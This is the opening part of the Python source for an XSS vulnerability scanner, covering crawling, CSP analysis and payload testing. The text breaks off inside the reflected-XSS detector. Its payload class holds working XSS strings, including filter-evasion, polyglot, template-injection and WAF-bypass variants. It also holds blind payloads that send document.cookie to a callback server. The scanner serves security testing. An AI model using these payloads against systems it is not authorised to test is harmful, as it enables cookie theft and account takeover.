#!/usr/bin/env python3
"""
ADVANCED XSS SCANNER - 4000+ Lines
Features:
1. URL-based scanning (no project folder needed)
2. Reflected, Stored, DOM XSS detection
3. Full AST parsing with taint analysis
4. Browser automation for dynamic analysis
5. Complete vulnerability classification
6. Advanced payload generation and testing
7. Multi-phase scanning approach
"""

import os
import re
import sys
import json
import time
import random
import socket
import hashlib
import logging
import asyncio
import argparse
import threading
import subprocess
from typing import *
from dataclasses import dataclass, field, asdict
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from collections import defaultdict, deque
import html
import sqlite3
import tempfile
import inspect
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64
import zlib
import pickle
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote, urlunparse,urlencode
import sys
import subprocess
import warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


# ============================================================================
# THIRD-PARTY IMPORTS WITH FALLBACKS (FIRST!)
# ============================================================================

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import aiohttp
    import aiofiles
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import lxml.etree as ET
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False



try:
    import dukpy
    DUKPY_AVAILABLE = True
except ImportError:
    DUKPY_AVAILABLE = False

try:
    from py_mini_racer import MiniRacer
    MINIRACER_AVAILABLE = True
except ImportError:
    MINIRACER_AVAILABLE = False


# ============================================================================
# DEPENDENCY INSTALLER
# ============================================================================

def install_packages(packages):
    """Install missing Python packages via pip"""
    if not packages:
        return

    print("[*] Installing missing dependencies:")
    print("    " + " ".join(packages))

    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", *packages]
    )


# ============================================================================
# DEPENDENCY CHECKER (FIXED LOGIC)
# ============================================================================

def check_dependencies():
    """Check and auto-install required dependencies"""
    missing = []

    if not REQUESTS_AVAILABLE:
        missing.append("requests")

    if not BS4_AVAILABLE:
        missing.append("beautifulsoup4")

    if not SELENIUM_AVAILABLE:
        missing.append("selenium")

    if not AIOHTTP_AVAILABLE:
        missing.extend(["aiohttp", "aiofiles"])


    if not LXML_AVAILABLE:
        missing.append("lxml")

    if not MINIRACER_AVAILABLE:
        missing.append("mini-racer")   # pip name

    if not DUKPY_AVAILABLE:
        missing.append("dukpy")

    # Remove duplicates
    missing = sorted(set(missing))

    if missing:
        install_packages(missing)
        print("[✓] Dependencies installed successfully\n")

        # 🔁 RE-IMPORT AFTER INSTALL (CRITICAL FIX)
        globals().update(reload_dependencies())


# ============================================================================
# RELOAD IMPORTS TO UPDATE FLAGS (NO API CHANGE)
# ============================================================================

def reload_dependencies():
    updated = {}

    try:
        import requests
        from requests.adapters import HTTPAdapter
        from requests.packages.urllib3.util.retry import Retry
        updated["REQUESTS_AVAILABLE"] = True
    except ImportError:
        updated["REQUESTS_AVAILABLE"] = False

    try:
        from bs4 import BeautifulSoup
        updated["BS4_AVAILABLE"] = True
    except ImportError:
        updated["BS4_AVAILABLE"] = False

    try:
        import aiohttp
        import aiofiles
        updated["AIOHTTP_AVAILABLE"] = True
    except ImportError:
        updated["AIOHTTP_AVAILABLE"] = False

    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        updated["SELENIUM_AVAILABLE"] = True
    except ImportError:
        updated["SELENIUM_AVAILABLE"] = False

    try:
        import lxml.etree as ET
        updated["LXML_AVAILABLE"] = True
    except ImportError:
        updated["LXML_AVAILABLE"] = False

    try:
        import dukpy
        updated["DUKPY_AVAILABLE"] = True
    except ImportError:
        updated["DUKPY_AVAILABLE"] = False

    try:
        from py_mini_racer import MiniRacer
        updated["MINIRACER_AVAILABLE"] = True
    except ImportError:
        updated["MINIRACER_AVAILABLE"] = False

    return updated


# ============================================================================
# RUN DEPENDENCY CHECK (SAFE)
# ============================================================================

check_dependencies()



# ============================================================================
# CONFIGURATION AND CONSTANTS
# ============================================================================

@dataclass
class ScannerConfig:
    """Complete scanner configuration"""
    # Scanning modes
    scan_types: List[str] = field(default_factory=lambda: ['reflected', 'stored', 'dom', 'blind'])
    max_depth: int = 3
    max_pages: int = 50
    max_concurrent: int = 10
    timeout: int = 30
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # Payload configurations
    test_payloads: bool = True
    payload_count: int = 50
    fuzz_parameters: bool = True
    fuzz_headers: bool = True
    fuzz_cookies: bool = True

    # Advanced options
    use_selenium: bool = True
    use_headless: bool = True
    use_proxy: str = None
    follow_redirects: bool = True
    verify_ssl: bool = False #False edited

    # Detection settings
    detect_waf: bool = True
    detect_frameworks: bool = True
    fingerprint_tech: bool = True

    # Performance
    request_delay: float = 0.5
    max_retries: int = 3

    # Output
    output_format: str = "json"
    verbose: bool = False
    debug: bool = False

    require_reflection: bool = True  # Must see payload reflected
    require_context: bool = True  # Must be in dangerous context
    min_confidence: float = 0.7  # Minimum confidence to report
    validate_dom: bool = True  # Validate DOM XSS with execution


class XSSPayloads:
    """Comprehensive XSS payload database"""

    # Basic payloads
    BASIC = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<a href="javascript:alert(1)">click</a>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<form><button formaction=javascript:alert(1)>',
    ]

    # Advanced evasion payloads
    EVASION = [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src=x oneonerrorrror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror="alert`1`">',
        '<img src=x onerror=alert.call(null,1)>',
        '<img src=x onerror=alert.bind(null)(1)>',
        '<img src=x onerror=(alert)(1)>',
        '<img src=x onerror=alert(1) //',
        '<img src=x oneonerrorrror=alert(1)//',
        '<img src=x onerror=eval("alert\\x281\\x29")>',
        '<img src=x onerror=eval("alert\x281\x29")>',
    ]

    # DOM-based payloads
    DOM = [
        "'-alert(1)-'",
        '"-alert(1)-"',
        '`${alert(1)}`',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'javascript:alert(document.domain)',
        'javascript:alert(window.name)',
        'javascript:eval(atob("YWxlcnQoMSk="))',
        'javascript:location=alert(1)',
        'javascript://%0aalert(1)',
    ]

    # Blind XSS payloads
    BLIND = [
        '<script>fetch("http://127.0.0.1:8008/P1/?data="+document.cookie)</script>',
        '<img src=x onerror="new Image().src=\'http://127.0.0.1:8008/P2/?data=\'+btoa(document.cookie)">',
        '<script>new Image().src="http://127.0.0.1:8008/P3/?domain="+document.domain</script>',
        '<iframe src="http://127.0.0.1:8008"></iframe>',
        '<link rel=ping href="http://127.0.0.1:8008">',
        '<script>navigator.sendBeacon("http://127.0.0.1:8008/?data=", document.cookie)</script>',
    ]

    # Polyglot payloads (work in multiple contexts)
    POLYGLOT = [
        'jaVasCript:/*-/*`/*\\`/*\\\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',

        '\'">><marquee><img src=x onerror=confirm(1)></marquee>">',

        '</plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(1) type=submit>',

        '-->\'"/></sCript><svG x=">" onload=(co\\u006efirm)``>',

        'javascript://%250aalert(1)',
    ]

    # Framework-specific payloads
    ANGULAR = [
        '{{constructor.constructor("alert(1)")()}}',
        '{{$eval.constructor("alert(1)")()}}',
        '{{a="constructor";b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].__proto__,a).value,0,"alert(1)")()}}',
    ]

    REACT = [
        '<img src={alert(1)}>',
        '<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}></div>',
    ]

    VUE = [
        '{{_c.constructor("alert(1)")()}}',
        '<div v-html="<img src=x onerror=alert(1)>"></div>',
    ]

    # WAF bypass payloads
    WAF_BYPASS = [
        '<script>prompt`1`</script>',
        '<script>confirm`1`</script>',
        '<script>print`1`</script>',
        '<img src=x onerror="window[\'ale\'+\'rt\'](window[\'doc\'+\'ument\'][\'dom\'+\'ain\'])">'
        '<svg><script>alert&#40;1&#41</script>',
        '<<script>alert(1);//<</script>',
        '<img src=x oneonerrorrror=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        '<marquee><img src=x onerror=alert(1)></marquee>',
    ]


# ============================================================================
# CORE DATA STRUCTURES
# ============================================================================

@dataclass
class Vulnerability:
    """Complete vulnerability representation"""
    id: str
    type: str  # reflected, stored, dom, blind, etc.
    url: str
    method: str
    parameter: str = None
    payload: str = None
    context: Dict[str, Any] = field(default_factory=dict)
    confidence: float = 0.0
    severity: str = "medium"
    evidence: str = None
    http_request: str = None
    http_response: str = None
    location: str = None  # Where in response payload appears
    cwe: List[str] = field(default_factory=lambda: ["CWE-79"])
    cvss_score: float = 0.0
    tags: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        result = asdict(self)
        result['cvss_vector'] = self.get_cvss_vector()
        return result

    def get_cvss_vector(self):
        if self.severity == "critical":
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
        elif self.severity == "high":
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
        elif self.severity == "medium":
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
        else:
            return "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"


@dataclass
class PageInfo:
    """Information about a scanned page"""
    url: str
    status_code: int
    content_type: str
    content_length: int
    title: str = None
    forms: List[Dict] = field(default_factory=list)
    inputs: List[Dict] = field(default_factory=list)
    links: List[str] = field(default_factory=list)
    scripts: List[str] = field(default_factory=list)
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    dom_elements: Dict[str, List] = field(default_factory=dict)
    javascript_analysis: Dict[str, Any] = field(default_factory=dict)
    screenshot_path: str = None


@dataclass
class ScanResult:
    """Complete scan result"""
    scan_id: str
    target_url: str
    start_time: str
    end_time: str = None
    duration: float = 0.0
    pages_scanned: int = 0
    requests_made: int = 0
    vulnerabilities_found: int = 0
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    possible_vulnerabilities: List[Vulnerability] = field(default_factory=list)
    possible_vulnerabilities_found :int=0
    pages: List[PageInfo] = field(default_factory=list)
    statistics: Dict[str, Any] = field(default_factory=dict)
    waf_detected: bool = False
    waf_type: str = None
    tech_stack: List[str] = field(default_factory=list)
    config: Dict[str, Any] = field(default_factory=dict)


# ============================================================================
# ADVANCED HTTP CLIENT
# ============================================================================

class AdvancedHTTPClient:
    """Advanced HTTP client with retries, proxy, and fingerprinting"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.session = None
        self.cookies = {}
        self.headers = {
            'User-Agent': config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.init_session()

    def init_session(self):
        """Initialize requests session with advanced settings"""
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests module is required")

        self.session = requests.Session()

        # Configure retries
        retry_strategy = Retry(
            total=self.config.max_retries,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Configure proxy
        if self.config.use_proxy:
            self.session.proxies = {
                'http': self.config.use_proxy,
                'https': self.config.use_proxy
            }

        # Update headers
        self.session.headers.update(self.headers)

    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with advanced features"""
        if not self.session:
            self.init_session()

        parsed_url = urlparse(url)
        is_localhost = parsed_url.hostname in ['localhost', '127.0.0.1', '0.0.0.0']

        # Auto-detect: verify SSL for public domains, don't verify for localhost
        if 'verify' not in kwargs:
            if is_localhost:
                kwargs['verify'] = False
            else:
                kwargs['verify'] = self.config.verify_ssl

        # Add default kwargs
        kwargs.setdefault('timeout', self.config.timeout)
        kwargs.setdefault('allow_redirects', self.config.follow_redirects)
        #kwargs.setdefault('verify', self.config.verify_ssl)

        # Add delay if configured
        if self.config.request_delay > 0:
            time.sleep(self.config.request_delay)

        try:
            response = self.session.request(method, url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for {url}: {e}")
            raise

    def get(self, url: str, **kwargs) -> requests.Response:
        return self.request('GET', url, **kwargs)

    def post(self, url: str, data=None, **kwargs) -> requests.Response:
        return self.request('POST', url, data=data, **kwargs)

    def put(self, url: str, data=None, **kwargs) -> requests.Response:
        return self.request('PUT', url, data=data, **kwargs)

    def delete(self, url: str, **kwargs) -> requests.Response:
        return self.request('DELETE', url, **kwargs)

    def head(self, url: str, **kwargs) -> requests.Response:
        return self.request('HEAD', url, **kwargs)

    def options(self, url: str, **kwargs) -> requests.Response:
        return self.request('OPTIONS', url, **kwargs)


# ============================================================================
# WEB CRAWLER
# ============================================================================

class WebCrawler:
    """Advanced web crawler for URL discovery - ONLY crawls same domain and subdomains"""

    def __init__(self, http_client: AdvancedHTTPClient, config: ScannerConfig):
        self.client = http_client
        self.config = config
        self.visited = set()
        self.to_visit = deque()
        self.discovered_pages = []
        self.lock = threading.Lock()
        self.base_domain = None

    def crawl(self, start_url: str) -> List[PageInfo]:
        """Crawl website starting from given URL with depth limitation"""
        # Store base domain for filtering
        self.base_domain = self._extract_base_domain(start_url)
        if not self.base_domain:
            logging.error(f"Invalid start URL: {start_url}")
            return []

        logging.info(f"Crawler: Restricting to domain: {self.base_domain}, Max depth: {self.config.max_depth}")

        if self.config.max_depth == 0:
            logging.info("Depth 0 specified - only scanning provided URL")
            page_info = self.crawl_page(start_url)
            return [page_info] if page_info else []

        # Use deque with depth tracking: (url, depth)
        self.to_visit = deque([(start_url, 0)])
        self.visited = set()
        self.discovered_pages = []

        while self.to_visit and len(self.visited) < self.config.max_pages:
            batch_size = min(len(self.to_visit), self.config.max_concurrent)
            current_batch = []

            # Get batch of URLs to process with their depths
            for _ in range(batch_size):
                if self.to_visit:
                    current_batch.append(self.to_visit.popleft())

            # Process batch concurrently
            with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                futures = []

                for url, depth in current_batch:
                    if url in self.visited:
                        continue

                    # Filter URLs BEFORE processing
                    if not self._is_same_domain(url):
                        logging.debug(f"Skipping external URL: {url}")
                        continue

                    self.visited.add(url)
                    future = executor.submit(self.crawl_page_with_depth, url, depth)
                    futures.append((future, url, depth))

                # Wait for all futures and collect results
                for future, url, depth in futures:
                    try:
                        page_info = future.result(timeout=self.config.timeout)
                        if page_info:
                            self.discovered_pages.append(page_info)

                            # Add new links to the queue for NEXT iteration if depth allows
                            if (len(self.visited) < self.config.max_pages and
                                    depth < self.config.max_depth - 1):  # depth is 0-based

                                for link in page_info.links:
                                    if (link not in self.visited and
                                            not any(link == item[0] for item in self.to_visit) and
                                            self._should_crawl_link(link)):
                                        self.to_visit.append((link, depth + 1))

                    except Exception as e:
                        logging.error(f"Crawl error for {url}: {e}")

        logging.info(f"Crawler finished: Found {len(self.discovered_pages)} pages within depth {self.config.max_depth}")
        return self.discovered_pages

    def crawl_page_with_depth(self, url: str, depth: int) -> Optional[PageInfo]:
        """Crawl a single page with depth info"""
        try:
            # Double-check domain before crawling
            if not self._is_same_domain(url):
                logging.debug(f"Skipping external domain at depth {depth}: {url}")
                return None

            logging.debug(f"Crawling depth {depth}: {url}")
            response = self.client.get(url)
            page_info = self.analyze_page(url, response)

            # Filter links immediately after extraction
            filtered_links = []
            for link in page_info.links:
                if self._should_crawl_link(link):
                    filtered_links.append(link)
                else:
                    logging.debug(f"Filtered out link: {link}")

            # Replace with filtered links
            page_info.links = filtered_links

            return page_info

        except Exception as e:
            logging.error(f"Failed to crawl {url}: {e}")
            return None

    def _extract_base_domain(self, url: str) -> str:
        """Extract base domain from URL (e.g., example.com from sub.example.com)"""
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return None

            # Remove port if present
            domain = parsed.netloc.split(':')[0]

            # For IP addresses, return as-is
            if re.match(r'\d+\.\d+\.\d+\.\d+', domain):
                return domain

            # For localhost, return as-is
            if domain == 'localhost':
                return domain

            # Extract base domain (last two parts for regular domains)
            parts = domain.split('.')
            if len(parts) >= 2:
                # Handle exceptions like .co.uk, .com.au
                if len(parts) > 2 and parts[-2] in ['co', 'com', 'org', 'net', 'gov', 'edu']:
                    return '.'.join(parts[-3:])
                return '.'.join(parts[-2:])
            return domain

        except Exception:
            return None

    def _is_same_domain(self, url: str) -> bool:
        """Check if URL belongs to same domain or subdomain"""
        if not self.base_domain:
            return True  # If no base domain set, allow all (shouldn't happen)

        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return False

            domain = parsed.netloc.split(':')[0]

            # Check for exact match or subdomain
            if domain == self.base_domain:
                return True

            # Check for subdomain (e.g., sub.example.com matches example.com)
            if domain.endswith('.' + self.base_domain):
                return True

            # Special case: localhost and 127.0.0.1
            if self.base_domain in ['localhost', '127.0.0.1']:
                return domain in ['localhost', '127.0.0.1', '0.0.0.0']

            return False

        except Exception:
            return False

    def _should_crawl_link(self, link: str) -> bool:
        """Determine if a link should be crawled"""
        # First check if it's the same domain
        if not self._is_same_domain(link):
            return False

        try:
            # Skip common static files
            static_extensions = [
                '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg',
                '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.avi', '.mov',
                '.pdf', '.zip', '.tar', '.gz', '.rar', '.exe', '.dmg', '.pkg',
                '.json', '.xml', '.csv', '.txt', '.log'
            ]

            # Parse the URL to get the path
            parsed = urlparse(link)
            path = parsed.path.lower()

            # Check file extensions
            if any(path.endswith(ext) for ext in static_extensions):
                return False

            # Skip non-HTTP/HTTPS protocols
            if parsed.scheme not in ['http', 'https', '']:
                return False

            # Skip common non-page URLs
            skip_patterns = [
                'javascript:', 'mailto:', 'tel:', 'sms:', 'data:',
                'ftp:', 'ssh:', 'file:', 'blob:', 'about:'
            ]
            if any(link.lower().startswith(pattern) for pattern in skip_patterns):
                return False

            # Skip URLs with fragments only
            if link.startswith('#'):
                return False

            # Skip URLs that are obviously payloads (like collaborator)
            payload_indicators = ['collaborator', 'burpcollaborator', 'interactsh']
            if any(indicator in link.lower() for indicator in payload_indicators):
                return False

            return True

        except Exception as e:
            logging.debug(f"Link validation failed for {link}: {e}")
            return False

    def crawl_page(self, url: str) -> Optional[PageInfo]:
        """Crawl a single page"""
        try:
            # Double-check domain before crawling
            if not self._is_same_domain(url):
                logging.debug(f"Skipping external domain in crawl_page: {url}")
                return None

            response = self.client.get(url)
            page_info = self.analyze_page(url, response)

            # Filter links immediately after extraction
            filtered_links = []
            for link in page_info.links:
                if self._should_crawl_link(link):
                    filtered_links.append(link)
                else:
                    logging.debug(f"Filtered out link: {link}")

            # Replace with filtered links
            page_info.links = filtered_links

            return page_info

        except Exception as e:
            logging.error(f"Failed to crawl {url}: {e}")
            return None

    def extract_links(self, html_content: str, base_url: str) -> List[str]:
        """Extract all links from HTML with immediate filtering"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        links = []

        # Define tags and their attributes that contain URLs
        tag_attributes = [
            ('a', 'href'),
            ('link', 'href'),
            ('img', 'src'),
            ('script', 'src'),
            ('iframe', 'src'),
            ('frame', 'src'),
            ('form', 'action'),
            ('area', 'href'),
            ('base', 'href'),
            ('embed', 'src'),
            ('source', 'src'),
            ('track', 'src'),
            ('object', 'data')
        ]

        for tag_name, attr in tag_attributes:
            for tag in soup.find_all(tag_name, {attr: True}):
                url = tag[attr]

                # Skip empty URLs
                if not url or url.strip() == '':
                    continue

                # Skip anchors and JavaScript
                if url.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
                    continue

                # Make absolute URL
                try:
                    absolute_url = urljoin(base_url, url)

                    # Filter immediately based on domain
                    if self.base_domain and not self._is_same_domain(absolute_url):
                        continue

                    # Add to links
                    links.append(absolute_url)

                except Exception as e:
                    logging.debug(f"Failed to process URL {url}: {e}")
                    continue

        # Remove duplicates
        unique_links = list(set(links))

        # Debug logging
        if unique_links:
            logging.debug(f"Extracted {len(unique_links)} links from {base_url}")
            if len(unique_links) <= 5:
                for link in unique_links:
                    logging.debug(f"  - {link}")

        return unique_links

    def analyze_page(self, url: str, response: requests.Response) -> PageInfo:
        """Analyze page content and extract information"""
        soup = None
        if BS4_AVAILABLE:
            soup = BeautifulSoup(response.text, 'html.parser')

        # Extract forms
        forms = self.extract_forms(response.text) if soup else []

        # Extract inputs
        inputs = self.extract_inputs(response.text) if soup else []

        # Extract scripts
        scripts = self.extract_scripts(response.text) if soup else []

        # Extract links (already filtered by extract_links)
        links = self.extract_links(response.text, url)

        # Extract title
        title = None
        if soup and soup.title:
            title = soup.title.string

        return PageInfo(
            url=url,
            status_code=response.status_code,
            content_type=response.headers.get('Content-Type', ''),
            content_length=len(response.content),
            title=title,
            forms=forms,
            inputs=inputs,
            links=links,
            scripts=scripts,
            cookies=dict(response.cookies),
            headers=dict(response.headers)
        )

    def extract_forms(self, html_content: str) -> List[Dict]:
        """Extract forms from HTML"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        forms = []

        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }

            # Extract form inputs
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'type': input_tag.get('type', 'text'),
                    'name': input_tag.get('name', ''),
                    'value': input_tag.get('value', ''),
                    'id': input_tag.get('id', ''),
                    'class': input_tag.get('class', [])
                }
                form_data['inputs'].append(input_data)

            forms.append(form_data)

        return forms

    def extract_inputs(self, html_content: str) -> List[Dict]:
        """Extract all input fields from HTML"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        inputs = []

        for tag in soup.find_all(['input', 'textarea', 'select']):
            input_data = {
                'tag': tag.name,
                'type': tag.get('type', 'text'),
                'name': tag.get('name', ''),
                'value': tag.get('value', ''),
                'id': tag.get('id', ''),
                'class': tag.get('class', []),
                'attributes': dict(tag.attrs)
            }
            inputs.append(input_data)

        return inputs

    def extract_scripts(self, html_content: str) -> List[str]:
        """Extract JavaScript sources"""
        if not BS4_AVAILABLE:
            return []

        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = []

        for script in soup.find_all('script'):
            if script.get('src'):
                scripts.append(script['src'])
            elif script.string:
                scripts.append(f"inline:{hashlib.md5(script.string.encode()).hexdigest()[:8]}")

        return scripts


# ============================================================================
# ADVANCED XSS DETECTION ENGINE
# ============================================================================

class XSSDetectionEngine:
    """Main XSS detection engine with multiple detection methods"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.payload_generator = XSSPayloadGenerator()
        self.detectors = {
            'reflected': ReflectedXSSDetector(config),
            'stored': StoredXSSDetector(config),
            'dom': DOMXSSDetector(config),
            'blind': BlindXSSDetector(config)
        }
        self.fingerprinter = TechnologyFingerprinter()
        self.waf_detector = WAFDetector()

    def analyze_url(self, url: str,page:PageInfo, http_client: AdvancedHTTPClient) -> List[Vulnerability]:
        """Analyze a single URL for XSS vulnerabilities"""
        vulnerabilities = []

        try:
            # First, fingerprint the target
            tech_info = self.fingerprinter.fingerprint(url, http_client)

            # Check for WAF
            waf_info = self.waf_detector.detect(url, http_client)

            # Test for reflected XSS
            if 'reflected' in self.config.scan_types:
                reflected_vulns = self.detectors['reflected'].test(url, http_client, self.payload_generator)
                vulnerabilities.extend(reflected_vulns)
                logging.info("Reflected XSS Scan Completed...")


            # Test for DOM XSS (requires JavaScript analysis)
            if 'dom' in self.config.scan_types and SELENIUM_AVAILABLE:
                dom_vulns = self.detectors['dom'].test(url, http_client, self.payload_generator)
                vulnerabilities.extend(dom_vulns)
                logging.info("DOM XSS Scan Completed...")

            if 'blind' in self.config.scan_types:
                blind_vulns = self.detectors['blind'].test(url, http_client, self.payload_generator)
                vulnerabilities.extend(blind_vulns)
                logging.info("Blind XSS Scan Completed...")

            # Test for stored XSS (requires form submission)
            '''if 'stored' in self.config.scan_types:
                # First crawl to find forms

                crawler = WebCrawler(http_client, self.config)
                pages = crawler.crawl(url)

                for page in pages:
                    for form in page.forms:
                        stored_vulns = self.detectors['stored'].test_form(
                            page.url, form, http_client, self.payload_generator
                        )
                        vulnerabilities.extend(stored_vulns)

                logging.info("Stored XSS Scan Completed !")'''
            if 'stored' in self.config.scan_types:
                # First crawl to find forms
                for form in page.forms:
                    stored_vulns = self.detectors['stored'].test_form(
                        page.url, form, http_client, self.payload_generator
                    )
                    vulnerabilities.extend(stored_vulns)

                logging.info("Stored XSS Scan Completed !")

            # Add context to vulnerabilities
            for vuln in vulnerabilities:
                vuln.context.update({
                    'technologies': tech_info,
                    'waf_detected': waf_info['detected'],
                    'waf_type': waf_info['type']
                })

        except Exception as e:
            logging.error(f"Analysis failed for {url}: {e}")

        return vulnerabilities



class CSPAnalyzer:
    def __init__(self, headers: Dict[str, str]):
        self.raw = headers.get("Content-Security-Policy", "")
        self.directives = self._parse()

    def _parse(self) -> Dict[str, List[str]]:
        result = {}

        for d in self.raw.split(";"):
            parts = d.strip().split()
            if len(parts) > 1:
                result[parts[0]] = parts[1:]
        return result

    def has_csp(self) -> bool:
        return bool(self.raw.strip())

    def has_directive(self, name: str) -> bool:
        return name in self.directives

    def blocks_inline(self) -> bool:
        return "'unsafe-inline'" not in self.directives.get("script-src", [])

    def allows_eval(self) -> bool:
        return "'unsafe-eval'" in self.directives.get("script-src", [])

    def allows_js_uri(self) -> bool:
        return "'unsafe-inline'" in self.directives.get("script-src", [])

    def nonce_reuse_possible(self) -> bool:
        nonces = [x for x in self.directives.get("script-src", []) if x.startswith("'nonce-")]
        return len(set(nonces)) < len(nonces)

    def unsafe_hashes(self) -> bool:
        return "'unsafe-hashes'" in self.directives.get("script-src", [])

    def summary(self) -> Dict[str, Any]:
        return {
            "present": self.has_csp(),
            "blocks_inline": self.blocks_inline(),
            "allows_eval": self.allows_eval(),
            "allows_js_uri": self.allows_js_uri(),
            "nonce_reuse_possible": self.nonce_reuse_possible(),
            "unsafe_hashes": self.unsafe_hashes()
        }

class FrameworkSinkDetector:
    REACT = ["dangerouslySetInnerHTML"]
    VUE = ["v-html"]
    ANGULAR = ["[innerHTML]", "$sce.trustAsHtml"]

    def detect(self, html: str) -> Dict[str, List[str]]:
        found = {"react": [], "vue": [], "angular": []}

        for k in self.REACT:
            if k in html:
                found["react"].append(k)

        for k in self.VUE:
            if k in html:
                found["vue"].append(k)

        for k in self.ANGULAR:
            if k in html:
                found["angular"].append(k)

        return found


class TrustedTypesDetector:
    def detect(self, headers: Dict[str, str]) -> bool:
        csp = headers.get("Content-Security-Policy", "")
        return "trusted-types" in csp or "require-trusted-types-for 'script'" in csp


class DOMTaintGraph:
    def __init__(self):
        self.flows = []

    def add(self, source: str, sink: str):
        self.flows.append({"source": source, "sink": sink})

    def risky(self) -> bool:
        return bool(self.flows)

    def summary(self):
        return self.flows


class ExploitabilityEngine:
    def assess(self, vuln, csp: CSPAnalyzer, browser_exec: bool) -> Dict[str, Any]:
        if vuln.type == "blind":
            return {"exploitable": False, "reason": "No OOB callback"}

        if csp.has_csp() and csp.blocks_inline():
            return {"exploitable": False, "reason": "Blocked by CSP"}

        if not browser_exec:
            return {"exploitable": False, "reason": "No browser execution"}

        return {"exploitable": True}


class CVSSCalculator:
    def score(self, exploitable: bool, stored=False, dom=False,reflected = False) -> float:
        if not exploitable:
            return 0.0
        if stored:
            return 8.8
        if dom or reflected:
            return 6.1
        return 5.4










class ReflectedXSSDetector:
    """
    Detect reflected XSS vulnerabilities with CSP, browser execution,
    and exploitability-aware scoring.
    """

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()

    # ============================================================
    # Entry point
    # ============================================================
    def test(self, url: str, http_client: AdvancedHTTPClient,
             payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:

        vulnerabilities = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # ---- Query parameters ----
        for param in params.keys():
            vulnerabilities.extend(
                self._test_parameter(url, param, http_client, payload_generator)
            )

